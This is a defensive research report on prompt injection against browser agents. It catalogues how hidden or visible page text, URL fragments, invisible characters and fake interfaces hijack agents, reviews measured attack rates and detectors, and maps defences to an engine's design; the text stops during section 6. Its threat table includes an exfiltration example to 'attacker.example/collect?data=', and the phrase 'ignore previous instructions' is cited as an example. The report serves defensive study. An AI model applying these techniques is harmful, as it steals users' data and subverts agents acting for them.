# Prompt injection and related attacks on browser agents: threats and defences

Researched on the web on 2026-10-06. Each point says where it comes from: **V** is a vendor's own
page (blog, documentation, model card, system card), **P** is a paper, **T** is a third party (an
independent researcher, a security company, the press, a government body). **Inference** marks a
conclusion of mine that no source states. Numbers in square brackets point to the list in "Sources".

How the pages were read, so the reader knows what to trust:

- Most pages were read through a summarising fetch tool. Words in quotation marks may not be word for word. Check the live page before copying a quote.
- Section 5.2 of Anthropic's Claude Opus 5 system card was downloaded and read as text. Its numbers and quotes are exact [3].
- A few pages were downloaded and read directly: Anthropic's computer-use documentation, the PIGuard and LLMail-Inject cards, the WASP readme, and the licence fields of the benchmark repositories.
- OpenAI's and Perplexity's pages refuse the fetch tool. They were read through a reader proxy (r.jina.ai).
- Not read: Cato Networks' own HashJack post (a bot wall; a press report was read instead), the Claude Opus 4.8 system card (its numbers here come from VentureBeat), the press report on Zenity's Black Hat 2026 talk (only a search summary), the EchoLeak and "Invitation Is All You Need" write-ups (only search summaries), Lakera's latency and prices, the character limits of Azure Prompt Shields, the Sentinel model card (it needs a sign-in).
- The web search budget ran out partway through. After that only known addresses were opened. Where something was not looked for, the text says "not searched".

## Summary

No vendor says prompt injection is solved, and the strongest papers say that every filter and every
prompt-level trick published so far falls to an attacker who adapts (above 90% success against most
of 12 defences [30]). The vendors therefore stack layers: a model trained to resist, a scan of what
comes in, a check of what goes out, fixed limits on which sites the agent may read and act on, limits
on where data may flow, and a person's confirmation for actions that matter [2][3][6][7][11][12][13][18][22].
The only number near zero comes from all layers together: Anthropic reports 0 successful attacks in
129 browser scenarios with its full safeguards, against 3.84% of attempts with the model alone, and
up to 14.75% for another of its models [3]. An engine that does not own the model cannot use the
first layer, and cannot use the planner-level designs (CaMeL, dual LLM, plan-then-execute), because
the planner is the client. It can use everything else, because every observation and every action
passes through it. The layers that do not depend on fooling or not fooling a model are worth the
most: keep private sign-ins away from the agent, limit the sites of a task, check data leaving for
another site, ask a person before consequential actions, and stop text a person cannot see from
reaching the model. A classifier and marked boundaries around page text are useful extra layers
and cheap, but they are filters, and filters leak.

## 1. Where the engine stands today

From the spec (sections 5.4, 8.1 to 8.8, 16.1) and the code, read on 2026-10-06.

- The snapshot leaves out what `checkVisibility` calls hidden (`display:none`, `visibility:hidden`, `content-visibility`), plus `aria-hidden`, `inert`, and script, style and template content (`driver/snapshot_page.js`).
- It does **not** leave out text that is rendered but cannot be seen: `opacity:0`, a font size of zero, a position far off screen, a zero-height box with hidden overflow, text in the colour of its background. All five are in use in the wild (section 2.1, I-2).
- Names come from `aria-label`, `alt`, `title` and `placeholder`. These are text a person does not see, and they reach the model.
- The page title and the address are printed at the top of every snapshot. The page controls both.
- Caps are short: 120 characters for a name, 300 for a text, 200 for a value. A long payload must be split over several elements. This helps a little. **Inference.**
- The model is told once, in the server instructions and tool descriptions, that page content is untrusted. Nothing in a result marks where page text starts and ends.
- The address policy blocks lists, private networks and cloud metadata at the network layer. With an empty allow list every public site is allowed. There is no notion of "the sites of this task".
- A person is asked before uploads, scripts in the page, and controls named pay, buy, send, delete and the like. Typing text into a page is not asked about.
- The engine never sees the user's request. An MCP server sees tool calls only.

## 2. Threat catalogue

### 2.1 How the instruction gets in

| # | Channel | How it works in a browser agent | Source |
|---|---|---|---|
| I-1 | Visible text in content that others write | A comment, a review, an issue, an advert or a post holds text addressed to the agent. The site is honest; one of its users is not. This is the largest group seen in the wild: 37.8% of observed payloads were plain visible text | Unit 42 [66] T; WASP threat model [48] P; Chrome names user content and adverts as the wide-reach vectors [11] V; Brave's Comet case used a Reddit comment [20] T |
| I-2 | Text hidden with CSS | `display:none`, `visibility:hidden`, `opacity:0`, `font-size:0` with `line-height:0`, `height:0` with `overflow:hidden`, `left:-9999px`, white text on white, a hidden `textarea`. 16.9% of observed payloads | Unit 42 [66] T; Guardio's fake CAPTCHA with an invisible text box [65] T; BrowseSafe-Bench "CSS-hidden text" [46] P |
| I-3 | Text in attributes and hidden fields | `aria-label`, `alt`, `title`, `data-*`, hidden form fields. 19.8% of observed payloads. One attack adds an invisible field with a helpful `aria-label` so the agent types the person's data into it | Unit 42 [66] T; EIA [55] P; Anthropic "hidden malicious form fields" [1] V; BrowseSafe-Bench [46] P |
| I-4 | Text in markup that is never shown | HTML comments, script and template content, CDATA inside SVG | Unit 42 [66] T; BrowseSafe-Bench [46] P |
| I-5 | Text in pictures | Faint text in an image (light blue on yellow) is read from a screenshot and obeyed. Text drawn on a canvas is in no DOM node at all | Brave [21] T; Unit 42 [66] T; Anthropic: "instructions on webpages or contained in images might override your instructions" [5] V; VPI-Bench [51] P |
| I-6 | Page title, tab title, address text | The model is shown them as if they were facts about the page. The page writes them | Anthropic "URL text injections, and tab title manipulations" [1] V |
| I-7 | The part of an address after `#` or `?` | "HashJack": the instruction sits after `#` on an honest site, never reaches the server, and is read by the assistant with the address. "CometJacking": the instruction sits in a query parameter of a link the person clicks. WASP uses the same trick as one of its two templates | Help Net Security on Cato's HashJack [63] T; LayerX [64] T; WASP [48] P |
| I-8 | Characters nobody can see | Unicode tag characters U+E0000 to U+E007F mirror ASCII, show as nothing, and are read by models | Rehberger [70] T |
| I-9 | Mail, calendar invitations, shared documents opened in the browser | The attacker needs no website. One email or invitation waits until the person asks the agent to summarise the inbox or the day | OpenAI's resignation-letter example [6] V; Anthropic's deleted-emails example [1] V; Zenity "PleaseFix" [67] T; "Invitation Is All You Need" (search summary only) [75] T |
| I-10 | Deceptive interface | Pop-ups a person would ignore, fake CAPTCHAs, fake "system" messages, fake turns of the user, a fake security policy that says pages must be "validated" first | Zhang et al. (86% average success) [54] P; Trail of Bits on Comet [68] T; Guardio [65] T |
| I-11 | Text that arrives late | Inserted by script after load, decoded from Base64 at run time, or delayed past the moment a scanner looks | Unit 42 [66] T |
| I-12 | Other languages and quiet wording | Instructions in another language, or phrased as an ordinary sentence with no "ignore previous instructions". The hardest group for every detector tested | BrowseSafe [46] P; Unit 42 (2.1% multilingual; 85.2% use social-engineering wording) [66] T; OpenAI: real attacks "increasingly resemble social engineering" [7] V |
| I-13 | A whole dishonest site | A fake shop or a phishing page. No injection is needed: the agent bought from the fake shop with saved card details and typed credentials into the phishing page | Guardio [65] T |
| I-14 | The engine's other outputs | Dialog text, console messages, network log entries, download file names, error messages that repeat page strings, values returned by a script. The page writes all of them | **Inference** from our tool list; no source tested these on our engine |

### 2.2 What a hijacked agent is made to do

| # | Goal | How | Source |
|---|---|---|---|
| G-1 | Send data out in an address | The agent opens `https://attacker.example/collect?data=…`. The server logs the address. The data can be Base64-encoded to slip past a check | OpenAI [8] V; LayerX [64] T; Trail of Bits [68] T |
| G-2 | Send data out by typing | The agent types what it read on one site into a field on another. No submit is needed: the page reads keystrokes. "Just typing text hardly ever triggers any confirmations" | Rehberger on Operator [69] T |
| G-3 | Send data out on the same site | Reply to the comment that held the instruction, send an email, share a folder | Brave [20] T; OpenAI [6] V; Zenity (search summary) [67] T |
| G-4 | Send data out through a picture or a request | The client shows an image whose address carries the data, or a script makes the request. Microsoft lists four routes: image tags, links, tool calls, and covert channels | MSRC [13] V; EchoLeak (search summary only) [58] |
| G-5 | Act on another site as the person | Open the mail tab, read the one-time code, take over the account; open the password vault and read it | Brave [20] T; Zenity [67] T |
| G-6 | Buy, pay, delete | Forced purchases and donations; "data destruction" was the aim of 14.2% of observed payloads | Unit 42 [66] T; Guardio [65] T; Anthropic [1] V |
| G-7 | Read local files, upload, download | An invitation made Comet read local files and send them out. A fake CAPTCHA led to a drive-by download | Zenity [67] T; Guardio [65] T |
| G-8 | Poison the clipboard | A button the agent clicks writes a phishing link to the clipboard. The agent has "zero awareness". The person pastes it later | Android Authority, reporting a researcher's post [71] T |
| G-9 | Mislead the person | A wrong summary, a phishing link or false advice in the agent's answer. 28.6% of observed payloads only aimed to change the output | Help Net Security [63] T; Unit 42 [66] T |

### 2.3 Attacks around the tool layer

- **M-1 Tool-description poisoning.** An MCP server hides instructions in a tool description. The person never sees them; the model does. A server can change a description after it was approved ("rug pull"), and one server's description can change how the model uses another server's tools ("shadowing") [62] T. The MCP specification tells clients to treat tool annotations as untrusted unless the server is trusted [23] V. For us: we are the server. The risk is another server shadowing our tools, and page text getting into anything a client treats as tool metadata. **Inference.**
- **M-2 The lethal trifecta by mixing tools.** Private data, untrusted content and a way to send data out, all in one agent, lets an attacker steal the data [59] T. A client that adds our browser to a file tool or a mail tool builds the trifecta without our knowing. Meta's "Rule of Two" says the same: an agent should have at most two of the three without supervision [15] V.

### 2.4 What was measured

| Who | Setting | Result | Source |
|---|---|---|---|
| Anthropic, August 2025 | Claude in Chrome pilot; 123 test cases, 29 scenarios | 23.6% of attacks succeeded without mitigations, 11.2% with. On four browser-specific attack types: 35.7% without, 0% with | [1] V |
| Anthropic, November 2025 | Claude Opus 4.5 in the extension; an adaptive attacker with 100 attempts per environment | 1% | [2] V |
| Anthropic, July 2026 (updated August) | 129 browser environments, 10 attempts each, in the Claude Cowork harness | Model alone: Opus 5 3.84% of attempts and 11 of 129 scenarios (the text beside the table says 3.70%), Opus 4.8 11.15% and 26, Sonnet 5 0.47% and 5, Mythos 5 7.80% and 29, Fable 5 14.75% and 43. With "auto mode" (a scan of tool results plus a classifier on tool calls): 0 of 129 for all but Fable 5, which had 0.25% and 3 | [3] V |
| Anthropic, same card | Coding; an adaptive attacker, 40 scenarios, 200 attempts each | Opus 5: 0.56% of attempts with the model alone, 0.18% with the scan of tool results. Opus 4.8: 7.03% and 2.09% | [3] V |
| Anthropic, same card | Gray Swan IPI benchmark: 1,130 attacks, 28 scenarios, no extra safeguards | Chance of a success within 15 attempts: Opus 5 2.0%, Opus 4.8 5.5%, the best model of another vendor 16.5% | [3] V |
| Anthropic, May 2026, as reported | Opus 4.8 system card, browser | 31.5% with the model alone, 0.5% with safeguards. A different harness from the row above | VentureBeat [74] T; original not read |
| Gray Swan competition | 13 models, 41 behaviours, 464 people, 272,000 attempts | 8,648 successful attacks. Per model from 0.5% (Claude Opus 4.5) to 8.5% (Gemini 2.5 Pro). Attack strategies carried over between model families | Dziemian et al. [53] P |
| Google | An adaptive attack (TAP) that makes Gemini send a passport number by email | 99.8% on Gemini 2.0; 53.6% on Gemini 2.5 after adversarial training. A calendar scenario: 100% and 94.6% | [44] P |
| Meta | AgentDojo, Llama 4 Maverick as the agent | 17.63% with no defence; 2.89% with the reasoning auditor; 1.75% with the auditor and Prompt Guard 2. Task success fell from 47.73% to 43.09% with the auditor | LlamaFirewall [43] P |
| WASP | Web agents on copies of GitLab and Reddit | Hijacked at some step in up to 86% of cases; the attacker's goal completed in 0 to 17% | [48] P |
| VPI-Bench | 306 cases on five platforms | Up to 51% for computer-use agents and up to 100% for browser-use agents on some platforms | [51] P |
| RedTeamCUA | 864 examples, web plus operating system | 42.9% (Claude 3.7 Sonnet), 7.6% (Operator), 60% (Claude 4.5 Sonnet, end to end) | [52] P |
| EIA | 177 action steps on real sites | 70% for stealing one piece of personal data, 16% for the whole request | [55] P |
| Nasr et al. | 12 published defences, attackers that adapt | Above 90% for most; a human red team beat every one | [30] P |
| OpenAI | Atlas | No number in the posts read | [6][7] V |

Two things to take from the table. First, the same model moves from about 4% to 0% by adding layers
around it, and those layers sit where our engine sits: on tool results coming in and on tool calls
going out [3]. Second, a model that looks safe on a fixed test set is not safe against an attacker
who tries again [30][44].

## 3. Defences

Each entry: what it is, what it needs, what it stops, what it costs, and whether our engine can use it.

### D1 A model trained to resist

- **What.** Reinforcement learning on simulated injections (Anthropic [2] V), adversarial training with an automated attacker (OpenAI [6] V, Gemini 2.5 [12][44]), a trained "instruction hierarchy" in which tool output ranks lowest [32] P, StruQ and SecAlign, which fine-tune a model to ignore instructions in a data channel [33][34] P.
- **Needs.** The model's weights or its training pipeline.
- **Stops.** The largest share of attacks, of any single layer. But Gemini 2.5 still failed 53.6% of one adaptive attack after training [44], and StruQ and Meta SecAlign were broken at 96% and above by adaptive attacks [30].
- **Cost.** Training. None at run time.
- **Usable by our engine: no**, because the engine does not choose the model. Partly, for our reference loop: we can pick a model with published numbers and say so in the documentation. Brave does exactly this [22] V.

### D2 Probes inside the model

- **What.** A small classifier on the model's activations that notices when the model drifts from its task (TaskTracker [41] P). Anthropic runs "prompt injection probes" on tool results in its products [3] V; the card does not say how they are built.
- **Needs.** Access to the model's internals.
- **Usable by our engine: no.**

### D3 Marking page text as data

- **What.** Spotlighting: wrap untrusted text in delimiters, or put a marker between every word ("datamarking"), or encode it in Base64, and tell the model that marked text is never an instruction [31] P. Google adds a reminder next to the content ("security thought reinforcement") [12] V. Chrome, Perplexity and Microsoft all do some form of it [11][18][13] V.
- **Needs.** Control of the text the model reads. The engine has that for its own results.
- **Stops.** In the paper, datamarking took success from about 50% to below 3% on GPT-3.5, and delimiters alone only halved it; the authors say delimiters "can be bypassed" and markers must be random and changed per call [31]. Against attackers who adapt, spotlighting fell above 95% of the time [30], and Google found spotlighting only "marginally successful" while a plain warning did better [44].
- **Cost.** A few tokens. Base64 costs many tokens and weak models cannot read it [31]; Azure's version makes the model mention the encoding [14] V.
- **Usable by our engine: yes.** A random boundary per result, the rule in the tool description, and a one-line reminder after page text. Cheap, so worth having; weak, so never the only layer.

### D4 Not passing on what a person cannot see

- **What.** Drop or label content that is on the page but not in front of a person: hidden text, attribute text, invisible characters, the fragment of an address. Rehberger: applications must filter the Unicode tag block [70] T. HashJack did not work on Claude for Chrome because it "lacks direct URL fragment access" [63] T.
- **Needs.** Control of how the page is read. This is the engine's own ground.
- **Stops.** I-2, I-4 and I-8 fully for each technique covered, and part of I-3 and I-7. Does nothing for visible text (I-1), which is the largest group in the wild [66].
- **Cost.** Style lookups per text node. Section 11 of the spec forbids a style lookup per element on the common path, so this needs a measurement.
- **Usable by our engine: yes.** The engine already does the first half. The gaps are listed in section 1.

### D5 A small classifier on incoming text

- **What.** A text classifier of 22 to 184 million parameters that labels a chunk as injection or not: Prompt Guard 2, ProtectAI's DeBERTa, PIGuard. Hosted versions: Azure Prompt Shields, Lakera Guard. Details in section 4.
- **Needs.** A local model file or an API key. No control of the agent model.
- **Stops.** Known, blunt patterns. On realistic web pages the small models miss most: Prompt Guard 2 found 21 to 22% of the injections in BrowseSafe-Bench, with almost no false alarms [46] P. Attackers who adapt beat ProtectAI, PromptGuard and Model Armor above 90% of the time and PIGuard 71% [30] P. Willison: 95% detection "is a failing grade" in security [59] T.
- **Cost.** 19 ms (22M) or 92 ms (86M) per 512-token chunk on an A100 GPU [16] V. CPU time is not published in what was read. A 20,000-character snapshot is several chunks.
- **Usable by our engine: yes**, as an optional layer.

### D6 A language model that scans or cleans incoming text

- **What.** A second model reads the tool result. It either answers "is there an instruction aimed at the agent?" (BrowseSafe [46], DataSentinel [37], gpt-oss-safeguard with a written policy [25]) or removes the instruction and passes the rest on (PromptArmor [38], the "tool-output firewall" [39]). Perplexity runs a fast classifier first and sends what it flags to a slower reasoning model [18] V. Anthropic's classifiers "automatically scan what the tools return, such as screenshots" and then steer the model to check with the user [5] V. Chrome runs its classifier in parallel with the planner and blocks actions based on flagged content [11] V.
- **Needs.** A second model, local or by API. For the cleaning kind, the user's task as well.
- **Stops.** On fixed benchmarks, nearly everything: PromptArmor reports under 1% missed and under 1% false alarms on AgentDojo [38]; the firewall reports 0% attack success on AgentDojo with 74% task success [39]. Under a three-stage adaptive attack the same firewall let 30% through and PromptArmor 75.5% [39]. BrowseSafe scores F1 0.904 on its own benchmark and drops to 0.788 on placements it was not trained on [46].
- **Cost.** One more model call per observation. BrowseSafe: under 1 second median on a GPU server. GPT-5 as a detector: about 2 seconds. Claude Sonnet 4.5 with thinking: 23 to 36 seconds [46]. Page content leaves the machine if the model is remote.
- **Usable by our engine: yes**, as the "optional model-based check run by the engine". Best run only on what D5 flags, or only when the session holds something worth stealing.

### D7 A check on each action by a model that has not read the page

- **What.** Chrome's User Alignment Critic sees "only metadata about the proposed action", not page content, and vetoes an action that does not serve the user's goal; the planner is told why and may try again [11] V. Brave's alignment checker is "firewalled from untrusted website input" [22] V. Anthropic runs a classifier on "every action Claude takes before it runs" [4] V. Related research: Task Shield checks each tool call against the user's goals (2.07% attack success, 69.79% task success on AgentDojo with GPT-4o) [36] P; LlamaFirewall's AlignmentCheck reads the agent's reasoning [43] P; MELON runs the agent a second time with the user's request masked and compares the tool calls [35] P.
- **Needs.** The user's task, and a second model. AlignmentCheck needs the agent's reasoning. MELON needs to re-run the agent.
- **Stops.** Actions that have nothing to do with the task. Not actions that look like the task. MELON was broken 76 to 95% of the time by adaptive attacks [30].
- **Cost.** One model call per action, or a doubling of all calls for MELON.
- **Usable by our engine: partly.** The engine sees every action but not the user's request. It can run a critic only if the client or the person states the task when the session starts. MELON and AlignmentCheck: no for outside clients, possible in our reference loop.

### D8 Limiting the sites of a task

- **What.** Chrome's Agent Origin Sets: per task, a set of origins the agent may read and a smaller set it may act on. A gating function that never sees page content decides what joins the set. Content of frames from other origins is not shown to the model [11] V. Anthropic's advice for computer use: "limiting internet access to an allowlist of domains" [5] V. Claude in Chrome asks per site [4] V.
- **Needs.** Control of navigation. A way to know the task's sites: the person, the client, or a gating model.
- **Stops.** G-1, G-2 and G-5 when the attacker's site or the victim's other accounts are outside the set. Does nothing on a site that is in the set (G-3).
- **Cost.** One question to the person per new site, or one model call.
- **Usable by our engine: yes.** It extends the address policy and the site permissions of section 8.8 from "sites this person allows" to "sites this task needs".

### D9 Keeping the person's identity away

- **What.** OpenAI's "logged-out mode" for Atlas [6] V. Brave's separate profile: "cookies, logged-in state, caches, and other site data do not cross profiles" [22] V. Anthropic: avoid giving the model "access to sensitive data, such as account login information" [5] V. Meta's Rule of Two: a browsing research agent may read untrusted pages and act, if it is in a sandbox with no private data [15] V.
- **Needs.** A separate browser profile.
- **Stops.** G-3, G-5 and most of G-1: there is nothing signed in to steal or misuse.
- **Cost.** The agent cannot do tasks that need the person's accounts.
- **Usable by our engine: yes.** Cloud headless and bundled Chromium already start clean. Take-over Chrome is the opposite case by design; under the Rule of Two it "requires supervision" [15].

### D10 Checking data that leaves

- **What.** OpenAI "Safe Url": detect when information the assistant learned in the conversation would be sent to a third party, then show the person exactly what would be sent, or block it [7] V. OpenAI's link check: an address is opened without asking only if an independent crawler already knows it as public; otherwise the person is warned that the link "may include information from your conversation" [8] V. Google and Microsoft block images and links in output that would carry data out [12][13] V. The research form is information-flow control: CaMeL [29] and FIDES [40] label every value with where it came from and block flows by rule.
- **Needs.** For the simple form: sight of what the agent read and what it now sends. For CaMeL and FIDES: control of the planner.
- **Stops.** G-1, G-2 and G-4 when the data is recognisable. Encoding defeats a string match (the CometJacking payload used Base64 for this reason [64]).
- **Cost.** String work per action. A question to the person now and then.
- **Usable by our engine: partly.** The engine sees page text it returned and addresses and typed text it is asked to send, so it can catch page data from site A going to site B. It cannot see data from the client's other tools or the user's request. Full information-flow control: no.

### D11 A person's confirmation

- **What.** Every vendor asks before purchases, payments, messages, deletions, downloads, entering sensitive data, password-manager sign-ins [1][4][6][11][12][18] V. The MCP specification says clients should "show tool inputs to the user before calling the server, to avoid malicious or accidental data exfiltration" [23] V.
- **Needs.** A place to ask that the page cannot reach. The engine has it (the viewer, the side panel).
- **Stops.** The action, if the right action is asked about and the person reads the question.
- **Limits.** Rehberger got past Operator's confirmations by typing instead of submitting [69] T. Willison notes the attack can also aim at the person [60] T. Too many questions teach people to click yes. **Inference** for the last sentence.
- **Usable by our engine: yes.** It exists (sections 8.2, 8.6, 8.8).

### D12 Designs that keep untrusted text away from the planner

- **What.** Six patterns from Beurer-Kellner et al. [28] P, with their principle: once an agent has read untrusted input, it must be impossible for that input to trigger a consequential action. Action-selector: the model picks from a fixed list and never reads results. Plan-then-execute: the plan is fixed before any untrusted text is read. Map-reduce: sub-agents read untrusted text and return only constrained values. Dual LLM: a privileged model plans and never sees untrusted text; a quarantined model reads it and returns values the planner handles only by name [60] T. Code-then-execute: the planner writes a program; CaMeL adds data-flow tracking and solves 77% of AgentDojo tasks with provable security against 84% undefended [29] P. Context-minimisation: remove text from the context when it is no longer needed. For computer use, a planner can write a whole branching plan before seeing the screen and keeps up to 57% of its performance on OSWorld; the screen can still steer which branch runs [45] P.
- **Needs.** Control of the agent loop. Often two models.
- **Stops.** By construction, the page cannot add new actions. It can still change values inside planned actions.
- **Cost.** Lost flexibility. Browsing is the hard case: each page decides the next step.
- **Usable by our engine: no** for outside clients, because the loop is theirs. **Partly** in two places. Our reference loop could plan first. And the code tool is close to code-then-execute: a script written before the pages are read has a fixed set of actions. **Inference**: no source tested this on a tool like ours.

### D13 Rules on tool calls

- **What.** A fixed policy on tool names and arguments, checked by ordinary code: Progent [42] P. NCSC: use "deterministic (non-LLM) safeguards that constrain the actions of the system" [73] T.
- **Usable by our engine: yes.** The tool policy (allow, confirm, deny) is this. It could look at arguments too: which site, which kind of field.

### D14 Clean tool surfaces

- **What.** Tool descriptions that never change during a session, that hold no text from a page, and that a client can pin [62] T. Results that keep the engine's own words apart from the page's words. The MCP specification requires servers to "sanitize tool outputs" [23] V.
- **Usable by our engine: yes.**

### D15 A locked-down mode

- **What.** OpenAI's Lockdown Mode "deterministically disables" the tools an attacker could use to get data out; browsing is limited to cached content [9] V.
- **Usable by our engine: yes**, as one deployment switch: allow list only, no scripts, no uploads or downloads, sub-resource checks on.

### D16 Reacting to a detection

- **What.** Perplexity stops and tells the person what was blocked and why [18] V. Google tells the person [12] V. Anthropic steers the model to ask the person [5] V, and Claude in Chrome falls back to asking before each step after repeated blocks (our earlier note `docs/research/settings.md`). Chrome returns control to the person after repeated vetoes [11] V. BrowseSafe replaces the flagged content with a placeholder so the agent never reads it [46] P.
- **Usable by our engine: yes.** A flag can move the session to "ask before every action" and show an event in the viewer.

### D17 Testing that never stops

- **What.** Automated attackers trained with reinforcement learning (OpenAI [6]), generated malicious sandbox sites (Chrome [11]), human red teams and bounties (Anthropic [2][3], Chrome's 20,000 dollar bounty [11]). Anthropic: human researchers "consistently outperform automated systems" at finding new attacks [2].
- **Usable by our engine: yes**, at our scale: a regression suite (section 7) and an attacker that tries variations.

## 4. Detection models

| Model | Size | Licence | How it runs | Published accuracy | Notes |
|---|---|---|---|---|---|
| Llama Prompt Guard 2 86M | 86M parameters, mDeBERTa-base, 512-token window | Llama 4 Community License | Local. 92.4 ms per 512 tokens on an A100 | AUC 0.998 and 97.5% recall at 1% false positives on Meta's private jailbreak set. On AgentDojo it prevents 81.2% of attacks at a 3% loss of task success. PINT score 78.76% (Lakera's test). On BrowseSafe-Bench: precision 0.983, recall 0.221 | [16] V, [26], [46]. Built for text that "explicitly attempts to override prior instructions"; the card says it has no label for subtler injected instructions. Long inputs must be split |
| Llama Prompt Guard 2 22M | 22M, DeBERTa-xsmall, 512 tokens | Same | Local. 19.3 ms on an A100 | AUC 0.995, recall 88.7% at 1% false positives; 78.4% on AgentDojo. On BrowseSafe-Bench: precision 0.975, recall 0.213 | [16] V, [46]. Weaker outside English |
| ProtectAI deberta-v3-base-prompt-injection-v2 | About 0.2B, 512 tokens | Apache 2.0 | Local; an ONNX build exists | 95.25% accuracy, 99.74% recall, 91.59% precision on 20,000 held-out prompts. PINT 79.14% | [24] V, [26]. English only. Does not detect jailbreaks. The card warns of false positives on system prompts. The parent repository is archived [76] |
| PIGuard (was InjecGuard) | DeBERTa-v3-base | MIT | Local | Claims 30.8% better than the best earlier model on its own over-defence test | [27][56]. Built to cut false alarms on harmless text that contains trigger words. Beaten 71% of the time by an adaptive attack [30] |
| BrowseSafe | 31B parameters (about 3B active), a fine-tuned Qwen3-30B-A3B | MIT on the model card | A GPU server (vLLM). Median under 1 second | F1 0.904, precision 0.978, recall 0.841 on BrowseSafe-Bench; F1 0.788 on unseen placements | [19][46]. Made for raw HTML; the card says running it on extracted text "may result in performance degradation". The card gives a 16,384-token window; the paper speaks of up to 80,000 |
| gpt-oss-safeguard-20b | 21B (3.6B active); fits a 16 GB GPU | Apache 2.0 | Local. You write the policy | On BrowseSafe-Bench: F1 0.790, precision 0.986, recall 0.658 | [25][46] |
| Azure Prompt Shields | Hosted | Paid service; a free tier at 5 requests a second | API: one user prompt and up to five documents per call | PINT 89.12% | [14][26]. Has a "document attack" mode meant for web pages and mail. Character limits not read. EchoLeak is reported to have got past Microsoft's classifier (search summary only) [58] |
| Lakera Guard | Hosted | Paid service | API; four sensitivity levels | PINT 95.22%, on Lakera's own benchmark | [26]. Latency and price not read |
| AWS Bedrock Guardrails, Google Model Armor | Hosted | Paid services | API | PINT 89.24% and 70.07% | [26]. Not looked at further. Model Armor was beaten above 90% by an adaptive attack [30] |
| A frontier model as the detector | — | — | API | On BrowseSafe-Bench: GPT-5 F1 0.855 at about 2 s; GPT-5 mini 0.854; Claude Sonnet 4.5 0.863 at 23 to 36 s; Claude Haiku 4.5 0.808 with precision 0.760 | [46] |
| OpenAI Moderation | Hosted, free | — | API | Not for this. Its 13 categories are harassment, hate, illicit, self-harm, sexual and violence. No injection category | [10] V |
| Llama Guard 4 | 12B | Llama 4 Community License | Local | Not for this. It labels 14 kinds of harmful content. Its card points to Prompt Guard 2 for injection | [17] V |

False alarms on ordinary pages, as far as the sources go:

- At the settings tested on BrowseSafe-Bench, most detectors raise few false alarms (precision 0.93 to 0.99) and pay for it by missing attacks [46].
- Harmless look-alikes hurt. With three benign "distractor" elements on a page (ordinary comments, data attributes, hidden fields), average detector accuracy fell from 90.2% to 81.2% [46]. Real pages are full of these.
- Classifiers lean on trigger words. On 339 harmless sentences that contain words such as "ignore", existing models scored near 60% [56].
- A detector with too many false alarms ruins the agent: one took task success on tau-bench down to 6.90% [39].
- No source read measures false alarms on a large sample of live, ordinary web pages in a format like our snapshot. We would have to measure this ourselves.

## 5. Attacks mapped to defences

My reading of the sources, not a measurement. "Stops" means stops by construction for the cases
covered; "reduces" means a filter that an adapting attacker can get past; "—" means no effect.

**Keeping the instruction from the model**

| Channel | D4 hide or strip | D3 mark as data | D5, D6 scan | D8 site limits |
|---|---|---|---|---|
| I-1 Visible text from others | — | reduces | reduces | reduces: only pages of the task are read |
| I-2 CSS-hidden text | stops, technique by technique | reduces | reduces; hidden markup is the easiest kind to detect [46] | as above |
| I-3 Attributes, hidden fields | reduces: cap and label; names cannot simply be dropped | reduces | reduces | as above |
| I-4 Comments, script, template | stops in the snapshot; not for scripts run in the page | — | reduces | as above |
| I-5 Text in pictures | — | reduces | reduces, and only with a model that reads images | as above |
| I-6 Title and address text | reduces: cap, put inside the marked block | reduces | reduces | — |
| I-7 After `#` or `?` | stops for the fragment if the model is never shown it; reduces for the query | reduces | reduces | — |
| I-8 Invisible characters | stops | — | — | — |
| I-9 Mail, invitations, documents | — | reduces | reduces | reduces: webmail must be in the task's set |
| I-10 Deceptive interface | — | reduces: a random boundary makes a fake "system" block easier to tell apart | reduces | reduces |
| I-11 Late text | — | reduces | reduces, if every observation is scanned | — |
| I-12 Other languages, quiet wording | — | reduces | weak: the hardest group [46] | — |
| I-14 The engine's other outputs | reduces: cap and mark them like page text | reduces | reduces | — |

**Limiting what a hijacked agent can do**

| Goal | D8 site limits | D9 identity kept away | D10 data-flow check | D11 confirmation | D7 action check | D13, D15 tool rules |
|---|---|---|---|---|---|---|
| G-1 Data out in an address | stops if the attacker's site is outside the set | stops for account data; not for what the agent itself was told | stops plain copies; reduces encoded ones | reduces | reduces | — |
| G-2 Data out by typing elsewhere | stops if that site is not writable | as above | reduces | stops only if typing across sites is asked about | reduces | — |
| G-3 Data out on the same site | — | stops: not signed in | — | stops when "send", "post", "share" trigger it | reduces | — |
| G-4 Data out by picture or request | stops with sub-resource checks on | reduces | reduces | stops for scripts (already confirm) | — | stops when scripts are denied |
| G-5 Acting on another site as the person | stops if that site is outside the set | stops | — | reduces | reduces | — |
| G-6 Buy, pay, delete | — | reduces | — | stops when the control's name matches; otherwise — | reduces | — |
| G-7 Files, uploads, downloads | stops for file addresses (off by default) | — | — | stops for uploads (already confirm) | — | stops when denied |
| G-8 Clipboard | — | stops in the cloud: not the person's clipboard | — | — | — | open question 9 |
| G-9 Misleading the person | — | — | — | — | — | — |
| M-1, M-2 Tool layer | — | reduces | reduces | reduces | — | D14 for our own tools; the rest is the client's |

G-9 has an empty row on purpose. The engine never sees the agent's answer. Only the input-side layers help.

## 6. Recommended layers for an engine that does not own the agent model

Ordered by how little each depends on a model behaving. The first four limit the damage when the
model is fooled. The next three make fooling it harder. The rest support them. Each says whether it
is there, an extension, or new. These are recommendations of mine built on the sources named.

1. **Start from "the model will sometimes be fooled".** OpenAI: design so that "the impact of manipulation is constrained, even if it succeeds" [7]. NCSC: deterministic safeguards, and treat the agent as having the privileges of whoever wrote the text it reads [73]. Beurer-Kellner et al.: after reading untrusted input, the agent must be unable to trigger consequential actions [28]. Every layer below is judged by this.

2. **Keep private sign-ins away by default.** *There for cloud headless and bundled Chromium; state it as a rule.* A clean profile means untrusted input plus actions, without private data: two of Meta's three [15]. OpenAI and Brave give the same advice [6][22]. Take-over Chrome has all three, so it should never run without a person supervising: keep "ask before acting" available and make consequential checks impossible to switch off there [15][5]. When a person signs the clean browser in to a site, treat the session as having all three from then on. **Inference** for the last sentence.

3. **Give each task a set of sites.** *New; extends 8.1 and 8.8.* Two sets as in Chrome: sites the agent may read, and sites it may act on [11]. The start address and sites the person names go in. A new site asks the person once ("Allow for this task"), outside the page. Frames from sites outside the set are not read. The decision must never be made by a model that has read the page [11]. An optional `task` and `sites` argument at session start lets a client fill the set; a hijacked agent cannot widen it later without a person.

